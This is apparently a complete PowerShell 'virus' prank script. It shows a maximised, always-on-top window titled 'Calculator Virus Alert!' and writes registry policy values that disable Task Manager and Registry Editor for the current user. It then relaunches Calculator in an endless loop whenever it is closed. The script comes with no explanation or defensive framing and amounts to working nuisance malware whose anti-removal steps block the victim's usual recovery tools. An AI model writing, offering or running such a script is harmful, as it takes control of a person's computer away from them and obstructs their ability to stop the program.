Add-Type -AssemblyName PresentationFramework
$popup = New-Object System.Windows.Window
$popup.Title = "Calculator Virus Alert!"
$popup.WindowStyle = 'ToolWindow'
$popup.WindowStartupLocation = 'CenterScreen'
$popup.SizeToContent = 'WidthAndHeight'
$popup.Topmost = $true
$popup.ResizeMode = 'NoResize'
$popup.WindowState = 'Maximized'
$popup.ShowDialog()

# Disable Task Manager and Registry Editor
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableRegistryTools -Value 1

# Open Calculator and keep it running
$calc = Start-Process -FilePath calc.exe -PassThru
do {
    Start-Sleep -Seconds 5
    if ($calc.HasExited) {
        $calc = Start-Process -FilePath calc.exe -PassThru
    }
} while ($true)
